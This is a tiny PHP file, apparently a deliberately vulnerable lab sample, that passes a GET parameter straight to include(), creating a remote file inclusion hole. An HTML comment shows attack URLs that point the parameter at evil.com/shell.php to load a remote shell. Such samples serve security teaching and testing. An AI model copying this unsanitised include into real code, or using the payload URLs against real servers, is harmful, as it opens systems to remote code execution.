<!-- http://localhost:8000/rfi.php?input=http://evil.com 
http://localhost:8000/rfi.php?input=http://evil.com/shell.php -->

<p> Usage example: http://localhost:8000/rfi.php?input=https://www.google.com </p>

<?php

$input = $_GET["input"];

include($input);

?>
